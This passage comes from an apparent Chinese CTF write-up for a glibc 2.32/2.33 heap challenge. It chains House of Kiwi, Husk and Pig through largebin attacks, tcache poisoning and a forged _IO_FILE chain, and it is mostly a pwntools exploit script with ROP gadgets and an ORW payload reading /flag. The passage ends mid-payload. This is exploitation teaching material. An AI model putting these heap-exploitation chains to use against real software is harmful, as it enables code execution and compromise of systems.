href="#Show">¶</a>Show</h4><p>leak 的是 buf 内容，也就是我们 calloc 的堆块。对我们的堆布局提出了一些要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1688</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  v1 = <span class="hljs-built_in">strlen</span>(buf);<br>  write(<span class="hljs-number">1</span>, buf, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exp-Kiwi-Husk-Pig-成链"><a class="header-anchor" href="#Exp-Kiwi-Husk-Pig-成链">¶</a>Exp.Kiwi -&gt; Husk -&gt; Pig 成链</h3><p>2.33 还是有 hook 的，Pig 是个不错的选择。</p><p><strong>思路介绍</strong></p><ol><li>简单布个局，有 UAF 我们很容易地 leak 出 libc。</li><li>再简单的拿个堆地址，整完事就把堆恢复回去，起码不要带个 unsorted 一直玩，容易出事。</li><li>构造出同一 idx 下的 Largebin 和 Unsortedbin，为 Largebin Attack 作准备。</li><li>Largebin Attack 开始乱 🐑 ，通常好一点的布局在有 Edit 的情况下，可以实现多次 Largebin Attak，👴 这是通常布局所以多次⑧是问题。</li><li>先打完 husk 的俩张表，在对应偏移处写 exit 函数。👴 这里拿的是 <strong>%s</strong> 也就是 $hex(ord(‘s’)*8)=0x398$ 。你拿 <strong>%u</strong> 也就是 <strong>0x3a8</strong> 也彳亍。</li><li>打 _IO_list_all，待会布置 _IO_FILE 链子。</li><li>打 main_arena 的 topchunk ，如果你想的话，去 leak 出真正的堆地址，然后错位打 size ，也 ⑧ 是不彳亍。</li><li>分配一个大堆块，<strong>Kiwi</strong> 里的 <strong>vfprintf</strong> 可以触发 <strong>Husk</strong> 进入 <strong>exit</strong>，然后在  <strong>_IO_flush_all_lockp</strong> 遍历我们的 IO 链子，实现 <strong>Pig</strong> 的手法。</li></ol><p><strong>IO 链解释</strong></p><p>👴 建议带 🔥 仔细跟一下 <strong>_IO_str_overflow</strong> 的汇编和源码。</p><ol><li>这里主要是用到了 <strong>_IO_str_overflow</strong> 里的非预期 <strong>malloc</strong> 堆块和 <strong>memcpy</strong>，结合我们的 <strong>TcachePoisoning</strong>，多次利用这个 trick，达到了任意写的功能。👴 这里扬掉了 <strong>__malloc_hook</strong> 。</li><li><strong>_IO_str_overflow</strong> 函数中会将我们 IO 结构体的 <strong>_IO_write_ptr</strong> 放到 <strong>rdx</strong>，利于高版本下的 <strong>setcontext+61</strong> 的绕沙盒操作。</li><li>因为这题没开沙箱，这里在堆地址上写 <code>/bin/sh\0</code>，在 <strong>__malloc_hook</strong> 写 system，把 <strong>malloc</strong> 的 size 控制成 $(bin_sh-100)//2$ 就可以 <strong>getshell</strong>。 栈迁移后经典 <strong>pop rdi,ret;bin_sh;system;</strong> 的布局当然也是欧尅的。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,28897)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x398</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>orw = flat([<br>    rax,<span class="hljs-number">2</span>,rdi,heap_base + <span class="hljs-number">0xD00</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">4</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0x10</span>,read_addr,rdi,<span class="hljs-number">1</span>,write_addr<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD00</span>,<span class="hljs-string">&#x27;/flag\0&#x27;</span>,<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,orw,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span 